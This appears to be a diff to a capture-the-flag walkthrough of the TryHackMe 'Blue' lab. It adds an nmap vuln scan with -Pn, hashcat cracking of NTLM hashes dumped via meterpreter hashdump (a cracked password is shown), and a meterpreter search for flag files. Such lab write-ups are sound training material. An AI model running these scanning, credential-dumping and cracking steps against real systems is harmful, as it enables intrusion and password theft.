@@ -1,5 +1,6 @@
 [![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
 [![Needed-Metasploit](https://img.shields.io/badge/Needed-Metasploit-orange)](https://www.metasploit.com/)
+[![Needed-Hashcat](https://img.shields.io/badge/Needed-Hashcat-lightgreen)](https://hashcat.net/hashcat/)
 
 # Blue
 
@@ -8,7 +9,7 @@ At a first scan with `nmap -sV $TARGET_IP` we notice that the target machine has
 To get a scan despite this, we can add to the command the option `-Pn`:
 ```
 ┌──(kali㉿kali)-[~]
-└─$ nmap -sV --script vuln 10.10.93.60 
+└─$ nmap -sV -Pn --script vuln 10.10.93.60 
 Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-26 07:35 EST
 Nmap scan report for 10.10.93.60
 Host is up (0.051s latency).
@@ -111,4 +112,41 @@ meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+
+## Cracking passwords
+The next step would be to crack users' passwords, and we can do it by using a powerful util like hashcat. To function hashcat needs a wordlist with the passwords to try, in our case `rockyou.txt`.<br>
+The final command will be:
+
+```
+┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/2-Blue]
+└─$ hashcat -m 1000 --username pwdhash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.5) starting
+
+Hashes: 3 digests; 2 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+[...]
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+31d6cfe0d16ae931b73c59d7e0c089c0:                         
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                 
+                                                       
+[...]
+```
+
+## Flags
+For this challenge there are 3 flags hidden in the victim's filesystem, and we are supposed to find them by following some hint... Fortunately we can do better and search for them with a `find` command:
+```
+meterpreter > find -f flag*txt
+   c:\flag.txt (24 bytes)
+   c:\Users\Jon\Documents\flag3.txt (37 bytes)
+   c:\Windows\System32\config\flag2.txt (34 bytes)
 ```
